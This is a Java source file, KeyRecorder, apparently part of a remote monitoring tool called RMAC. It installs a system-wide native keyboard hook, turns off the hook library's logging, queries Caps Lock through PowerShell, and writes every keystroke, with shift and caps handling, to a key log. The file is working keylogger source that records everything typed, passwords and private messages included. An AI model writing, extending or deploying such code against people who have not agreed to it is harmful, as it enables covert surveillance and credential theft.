package com.rmac.core;

import com.rmac.RMAC;
import com.rmac.utils.Constants;
import com.rmac.utils.PipeStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.LogManager;
import lombok.extern.slf4j.Slf4j;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Listens for key events and forwards them to <code>KeyLog</code>
 *
 * @see com.rmac.core.KeyLog
 */
@Slf4j
public class KeyRecorder implements NativeKeyListener {

  public static NativeKeyListener nativeKeyListener;
  public static boolean isShift = false;
  public static boolean isCaps = false;
  public static HashMap<String, String[]> dualKeys;

  static {
    dualKeys = new HashMap<>();
    dualKeys.put("Back Quote", new String[]{"`", "~"});
    dualKeys.put("Comma", new String[]{",", "<"});
    dualKeys.put("Period", new String[]{".", ">"});
    dualKeys.put("Slash", new String[]{"/", "?"});
    dualKeys.put("Semicolon", new String[]{";", ":"});
    dualKeys.put("Quote", new String[]{"'", "\""});
    dualKeys.put("Open Bracket", new String[]{"[", "{"});
    dualKeys.put("Close Bracket", new String[]{"]", "}"});
    dualKeys.put("Minus", new String[]{"-", "_"});
    dualKeys.put("Equals", new String[]{"=", "+"});
    dualKeys.put("Back Slash", new String[]{"\\", "|"});
    dualKeys.put("1", new String[]{"1", "!"});
    dualKeys.put("2", new String[]{"2", "@"});
    dualKeys.put("3", new String[]{"3", "#"});
    dualKeys.put("4", new String[]{"4", "$"});
    dualKeys.put("5", new String[]{"5", "%"});
    dualKeys.put("6", new String[]{"6", "^"});
    dualKeys.put("7", new String[]{"7", "&"});
    dualKeys.put("8", new String[]{"8", "*"});
    dualKeys.put("9", new String[]{"9", "("});
    dualKeys.put("0", new String[]{"0", ")"});
  }

  public KeyRecorder() {
    LogManager.getLogManager().reset();
    java.util.logging.Logger logger = java.util.logging.Logger.getLogger(
        GlobalScreen.class.getPackage().getName());
    logger.setLevel(Level.OFF);

    try {
      GlobalScreen.registerNativeHook();
    } catch (NativeHookException ex) {
      log.error("JNH initialization failed", ex);
    }
    nativeKeyListener = this;
    GlobalScreen.addNativeKeyListener(nativeKeyListener);
  }

  /**
   * Get Caps Lock state
   *
   * @return Caps Lock state (true = locked | false = unlocked)
   */
  public boolean getCapsState() {
    ProcessBuilder build = new ProcessBuilder("powershell", "[Console]::CapsLock");
    build.directory(new File(Constants.RUNTIME_LOCATION));

    StringBuilder result = new StringBuilder();
    try {
      Process proc = this.startProcess(build);
      BufferedReader out = RMAC.fs.getReader(proc.getInputStream());
      PipeStream err = PipeStream.make(proc.getErrorStream(), System.err);
      err.start();

      String curr;
      while ((curr = out.readLine()) != null) {
        result.append(curr.trim());
      }

      proc.waitFor();
      out.close();
    } catch (IOException | InterruptedException e) {
      log.error("Could not get Caps Lock state", e);
      return false;
    }

    return result.toString().equals("True");
  }

  @Override
  public void nativeKeyPressed(NativeKeyEvent nke) {
    String key = NativeKeyEvent.getKeyText(nke.getKeyCode());
    String code = Integer.toString(nke.getRawCode(), 16).toLowerCase();
    switch (key) {
      case "Caps Lock": {
        isCaps = this.getCapsState();
        break;
      }
      case "Shift": {
        isShift = true;
        RMAC.keyLog.println("[Shift|" + nke.getKeyLocation() + "]");
        break;
      }
      case "Delete": {
        RMAC.keyLog.println("[Delete|" + nke.getKeyLocation() + "]");
        break;
      }
      case "Enter": {
        RMAC.keyLog.println();
        break;
      }
      case "Space": {
        RMAC.keyLog.print(" ");
        break;
      }
      case "Tab":
      case "Meta":
      case "Ctrl":
      case "F1":
      case "F2":
      case "F3":
      case "F4":
      case "F5":
      case "F6":
      case "F7":
      case "F8":
      case "F9":
      case "F10":
      case "F11":
      case "F12":
      case "Alt":
      case "Context Menu":
      case "Left":
      case "Right":
      case "Up":
      case "Down":
      case "Backspace":
      case "End":
      case "Home":
      case "Insert":
      case "Page Up":
      case "Page Down":
      case "Mute":
      case "Volume Up":
      case "Volume Down":
      case "Num Lock":
      case "Print Screen":
      case "Escape":
        RMAC.keyLog.println("[" + key + "]");
        break;
      case "Back Quote":
      case "Comma":
      case "Period":
      case "Slash":
      case "Semicolon":
      case "Quote":
      case "Open Bracket":
      case "Close Bracket":
      case "Minus":
      case "Equals":
      case "Back Slash":
      case "1":
      case "2":
      case "3":
      case "4":
      case "5":
      case "6":
      case "7":
      case "8":
      case "9":
      case "0":
        RMAC.keyLog.print(this.getDual(key));
        break;
      default: {
        if (key.contains("Unknown")) {
          if (code.equals("a1")) {
            isShift = true;
            RMAC.keyLog.println("[Shift|" + nke.getKeyLocation() + "]");
          } else {
            RMAC.keyLog.println("[0x" + code + "]");
          }
        } else {
          RMAC.keyLog.print(isCaps == isShift ? key.toLowerCase() : key);
        }
      }
    }
  }

  @Override
  public void nativeKeyReleased(NativeKeyEvent nke) {
    String key = NativeKeyEvent.getKeyText(nke.getKeyCode());
    String code = Integer.toString(nke.getRawCode(), 16).toLowerCase();
    if ("Shift".equals(key) || "a1".equals(code)) {
      isShift = false;
    }
  }

  @Override
  public void nativeKeyTyped(NativeKeyEvent nke) {
  }

  public String getDual(String dual) {
    return isShift ? dualKeys.get(dual)[1] : dualKeys.get(dual)[0];
  }

  public Process startProcess(ProcessBuilder builder) throws IOException {
    return builder.start();
  }
}
